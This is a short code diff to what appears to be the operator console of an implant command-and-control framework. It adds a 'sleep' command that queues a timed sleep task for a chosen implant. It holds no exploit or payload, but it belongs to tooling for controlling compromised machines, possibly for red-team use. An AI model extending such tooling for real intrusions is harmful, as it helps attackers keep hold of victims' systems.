@@ -62,6 +62,8 @@ def handle(cmd: str, args: List[str], config: OperatorConfig, implant_id: str) -
         handle_sysinfo(config, implant_id)
     elif cmd == "result" or cmd == "results":
         handle_result(config, args)
+    elif cmd == "sleep":
+        handle_sleep(config, implant_id, args)
     elif cmd == "back":
         return True
     elif cmd == "clear":
@@ -235,3 +237,19 @@ def handle_result(config: OperatorConfig, args: List[str]) -> None:
     task_id = args[0]
     logger.debug(f"Getting results for task {task_id}")
     print_task_result(config, task_id)
+
+def handle_sleep(config: OperatorConfig, implant_id: str, args: List[str]) -> None:
+    """
+    Handle the sleep command, send a sleep task to the implant
+    """
+    if len(args) < 1:
+        logger.error("Please provide a number of seconds to sleep")
+        return
+
+    if not args[0].isdigit():
+        logger.error("Sleep time must be an integer")
+        return
+
+    seconds = args[0]
+    logger.debug(f"Sending sleep task to {implant_id}")
+    add_task(config, Opcodes.SLEEP.value, implant_id, int(seconds))
